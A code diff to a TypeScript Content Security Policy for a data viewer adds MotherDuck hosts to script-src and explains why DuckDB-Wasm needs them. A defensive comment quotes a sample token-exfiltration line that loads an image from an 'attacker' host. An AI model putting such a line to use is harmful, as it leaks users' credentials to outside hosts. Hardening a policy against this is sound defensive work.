@@ -41,7 +41,10 @@ function escapeHtml(s: string): string {
  */
 export const DIVE_VIEWER_CSP = [
   "default-src 'none'",
-  "script-src 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com https://unpkg.com https://esm.sh",
+  // app.motherduck.com is in script-src because the DuckDB-Wasm worker
+  // `importScripts()` its worker bundle from there (importScripts is governed
+  // by script-src, not connect-src). 'unsafe-eval' also permits wasm compile.
+  "script-src 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com https://unpkg.com https://esm.sh https://*.motherduck.com",
   'connect-src https://*.motherduck.com wss://*.motherduck.com https://esm.sh https://unpkg.com https://cdn.jsdelivr.net',
   // Lock down non-fetch exfil channels: no blanket `https:`. Images may only
   // come from data: URIs or MotherDuck (blocks `new Image().src='https://attacker/?t='+token`
